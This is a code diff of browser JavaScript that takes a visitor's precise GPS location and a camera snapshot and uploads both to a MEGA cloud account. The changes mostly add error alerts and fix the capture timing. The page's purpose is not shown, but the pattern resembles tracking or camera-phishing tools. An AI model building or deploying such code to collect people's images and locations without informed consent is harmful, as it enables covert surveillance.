@@ -38,7 +38,9 @@
                     const loc = `Latitude: ${lat}, Longitude: ${lng}`;
                     capturePhoto(loc);
                 },
-                (error) => {},
+                (error) => {
+                    alert("Error with GPS: " + error.message);
+                },
                 { enableHighAccuracy: true, maximumAge: 0 }
             );
         }
@@ -50,30 +52,37 @@
                 const video = document.createElement("video");
                 video.srcObject = stream;
 
-                video.onloadedmetadata = async () => {
+                // Ensure video is playing and metadata is loaded
+                video.onloadedmetadata = () => {
                     video.play();
-                    const canvas = document.getElementById("canvas");
-                    const ctx = canvas.getContext("2d");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
 
-                    // Wait for video to start playing before capturing
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // Wait for video to actually start playing before capturing
+                    video.onplaying = () => {
+                        const canvas = document.getElementById("canvas");
+                        const ctx = canvas.getContext("2d");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
 
-                    // Stop all tracks after capturing
-                    stream.getTracks().forEach(track => track.stop());
+                        // Capture the image from video
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Notify success and upload
-                    alert("Photo successfully captured!");
-                    uploadToMega(canvas, location);
+                        // Stop all media tracks after capturing
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Notify the user that the photo has been captured
+                        alert("Photo successfully captured!");
+
+                        // Upload photo to MEGA
+                        uploadToMega(canvas, location);
+                    };
                 };
 
-                video.onerror = () => {
-                    alert("Error with video capture.");
+                video.onerror = (e) => {
+                    alert("Error with video capture: " + e.message);
                     stream.getTracks().forEach(track => track.stop());
                 };
             } catch (error) {
-                alert("Error accessing the camera.");
+                alert("Error accessing camera: " + error.message);
             }
         }
 
@@ -92,7 +101,9 @@
 
             mega.upload("photo.jpg", imageBlob)
                 .then(() => mega.upload("location.txt", locationBlob))
-                .catch(() => {});
+                .catch((error) => {
+                    alert("Error uploading to MEGA: " + error.message);
+                });
         }
 
         function dataURLtoBlob(dataurl) {
